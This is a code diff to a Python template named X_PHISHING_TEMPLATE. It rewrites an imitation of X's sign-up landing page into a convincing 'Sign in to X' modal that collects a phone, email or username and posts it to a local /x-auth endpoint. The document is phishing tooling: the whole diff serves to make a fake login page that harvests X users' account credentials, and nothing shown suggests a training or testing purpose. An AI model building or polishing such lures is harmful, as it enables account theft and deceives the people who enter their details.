@@ -44,7 +44,7 @@ X_PHISHING_TEMPLATE = '''
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>X</title>
+    <title>X - Sign in</title>
     <style>
         * {
             margin: 0;
@@ -60,131 +60,137 @@ X_PHISHING_TEMPLATE = '''
             align-items: center;
             justify-content: center;
         }
-        .main-container {
-            max-width: 500px;
+        .modal {
+            background: #000;
             width: 100%;
-            padding: 40px 20px;
+            max-width: 480px;
+            padding: 32px 24px;
+            border-radius: 16px;
+            position: relative;
             text-align: center;
         }
-        .x-logo {
-            font-size: 220px;
-            font-weight: 900;
-            letter-spacing: -15px;
-            line-height: 0.75;
-            margin-bottom: 60px;
+        .close {
+            position: absolute;
+            top: 16px;
+            left: 16px;
+            font-size: 24px;
+            cursor: pointer;
             color: #fff;
         }
-        h1 {
-            font-size: 60px;
-            font-weight: 800;
-            margin-bottom: 12px;
+        .logo {
+            font-size: 48px;
+            font-weight: 900;
+            margin: 20px 0 40px;
+            letter-spacing: -4px;
         }
-        h2 {
-            font-size: 32px;
-            font-weight: 700;
-            margin-bottom: 50px;
+        h1 {
+            font-size: 31px;
+            font-weight: 800;
+            margin-bottom: 40px;
         }
         .btn {
             display: flex;
             align-items: center;
             justify-content: center;
             width: 100%;
-            max-width: 380px;
-            margin: 12px auto;
-            padding: 16px 24px;
+            padding: 12px 24px;
+            margin: 12px 0;
             font-size: 17px;
             font-weight: 700;
             border-radius: 9999px;
             border: none;
             cursor: pointer;
-            transition: background 0.15s;
         }
         .btn-google {
             background: #fff;
             color: #000;
         }
-        .btn-google:hover { background: #f0f0f0; }
         .btn-apple {
             background: #fff;
             color: #000;
         }
-        .btn-apple:hover { background: #f0f0f0; }
-        .btn-create {
-            background: #1d9bf0;
-            color: white;
-        }
-        .btn-create:hover { background: #1a8cd8; }
         .or {
-            margin: 24px 0;
-            font-size: 15px;
+            margin: 20px 0;
             color: #71767b;
+            font-size: 15px;
             font-weight: 500;
         }
-        .legal {
-            margin-top: 40px;
-            font-size: 13px;
-            color: #71767b;
-            line-height: 1.5;
+        .input-group {
+            margin: 24px 0;
         }
-        .legal a {
-            color: #1d9bf0;
-            text-decoration: none;
-        }
-        .legal a:hover { text-decoration: underline; }
-        .already {
-            margin-top: 60px;
+        input {
+            width: 100%;
+            padding: 16px;
             font-size: 17px;
-            color: #e7e9ea;
+            background: #000;
+            border: 1px solid #536471;
+            border-radius: 8px;
+            color: #fff;
         }
-        .already a {
-            color: #1d9bf0;
+        input::placeholder {
+            color: #71767b;
+        }
+        .next-btn {
+            width: 100%;
+            padding: 12px;
+            background: #fff;
+            color: #000;
+            font-size: 17px;
             font-weight: 700;
+            border: none;
+            border-radius: 9999px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .forgot {
+            margin: 20px 0;
+            font-size: 15px;
+        }
+        .forgot a {
+            color: #1d9bf0;
             text-decoration: none;
         }
-        .grok {
-            margin-top: 80px;
+        .signup {
+            margin-top: 40px;
             font-size: 15px;
             color: #71767b;
         }
-        .grok a {
+        .signup a {
             color: #1d9bf0;
-            font-weight: 700;
             text-decoration: none;
+            font-weight: 700;
         }
         @media (max-width: 500px) {
-            .x-logo { font-size: 160px; letter-spacing: -10px; margin-bottom: 40px; }
-            h1 { font-size: 48px; }
-            h2 { font-size: 28px; }
-            .btn { max-width: 90%; }
+            .modal { padding: 24px 16px; }
+            .logo { font-size: 40px; }
+            h1 { font-size: 28px; }
         }
     </style>
 </head>
 <body>
-    <div class="main-container">
-        <div class="x-logo">X</div>
-        <h1>Happening now</h1>
-        <h2>Join today.</h2>
+    <div class="modal">
+        <div class="close">×</div>
+        <div class="logo">X</div>
+        <h1>Sign in to X</h1>
 
-        <button class="btn btn-google">G Sign up with Google</button>
-        <button class="btn btn-apple">Sign up with Apple</button>
+        <button class="btn btn-google">G Sign in with Google</button>
+        <button class="btn btn-apple">Sign in with Apple</button>
 
-        <div class="or">OR</div>
+        <div class="or">or</div>
 
         <form action="/x-auth" method="post">
-            <button type="submit" class="btn btn-create">Create account</button>
+            <div class="input-group">
+                <input type="text" name="identifier" placeholder="Phone, email, or username" required autofocus>
+            </div>
+            <button type="submit" class="next-btn">Next</button>
         </form>
 
-        <div class="legal">
-            By signing up, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>,  
-            including <a href="#">Cookie Use</a>.
+        <div class="forgot">
+            <a href="#">Forgot password?</a>
         </div>
 
-        <div class="already">
-            Already have an account? <a href="#">Sign in</a>
-        </div>
-
-        <div class="grok">
-            <a href="#">Get Grok</a>
+        <div class="signup">
+            Don't have an account? <a href="#">Sign up</a>
         </div>
     </div>
 </body>
